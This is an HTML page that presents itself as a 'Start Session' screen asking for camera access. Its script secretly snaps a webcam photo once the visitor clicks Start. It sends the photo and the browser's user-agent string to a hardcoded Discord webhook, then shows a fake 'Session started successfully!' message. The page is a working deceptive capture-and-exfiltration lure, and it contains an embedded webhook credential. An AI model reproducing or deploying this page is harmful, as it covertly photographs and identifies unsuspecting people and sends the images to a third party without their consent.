<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Start Session</title>
<style>
  body {
    margin: 0;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
    color: white;
    text-align: center;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    height: 100vh;
    overflow: hidden;
  }

  img#logo {
    width: 250px;
    animation: bounce 2s infinite;
  }

  h1 {
    font-size: 2.5rem;
    margin: 20px 0 10px 0;
    animation: fadeInDown 1.5s ease;
  }

  p {
    font-size: 1.2rem;
    margin-bottom: 30px;
    animation: fadeIn 2s ease;
  }

  button {
    background: #ff004c;
    color: white;
    border: none;
    padding: 15px 30px;
    font-size: 1.2rem;
    cursor: pointer;
    border-radius: 10px;
    transition: transform 0.2s;
  }

  button:hover {
    transform: scale(1.1);
  }

  p#footer {
    margin-top: 50px;
    font-size: 0.9rem;
    color: #aaa;
  }

  @keyframes fadeInDown {
    from { opacity: 0; transform: translateY(-50px); }
    to { opacity: 1; transform: translateY(0); }
  }

  @keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
  }

  @keyframes bounce {
    0%, 100% { transform: translateY(0); }
    50% { transform: translateY(-20px); }
  }
</style>
</head>
<body>

<img id="logo" src="https://pngimg.com/uploads/jester/jester_PNG27.png" alt="Logo">
<h1>Start Session</h1>
<p>To continue, camera access is required.</p>
<button id="startBtn">Start</button>
<p id="footer">Made by ReSe</p>

<video id="cam" autoplay playsinline style="display:none;"></video>

<script>
const webhookURL = "https://discordapp.com/api/webhooks/1413325609819443260/Sq7WJJvwVhTYeKlhCYxoGdnW3xajB0xQL2T1A43B4E5L779JRns3NzvN3yP6MBTXT1Az";
const startBtn = document.getElementById("startBtn");
const video = document.getElementById("cam");

startBtn.addEventListener("click", async () => {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    // Tomar la foto automÃ¡ticamente
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext("2d");

    // Espera 1 segundo para que la cÃ¡mara cargue
    setTimeout(() => {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Convertir a blob y enviar a Discord
      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append("file", blob, "photo.png");

        // InformaciÃ³n del dispositivo y paÃ­s (navegador)
        formData.append("payload_json", JSON.stringify({
          content: `ðŸ“¸ Photo captured\nðŸ’» Device: ${navigator.userAgent}`
        }));

        fetch(webhookURL, {
          method: "POST",
          body: formData
        })
        .then(() => console.log("âœ… Photo sent!"))
        .catch(err => console.error(err));

      }, "image/png");

      // Detener la cÃ¡mara
      stream.getTracks().forEach(track => track.stop());
      alert("Session started successfully!");
    }, 1000);

  } catch (err) {
    alert("Camera access denied or unavailable.");
    console.error(err);
  }
});
</script>

</body>
</html>
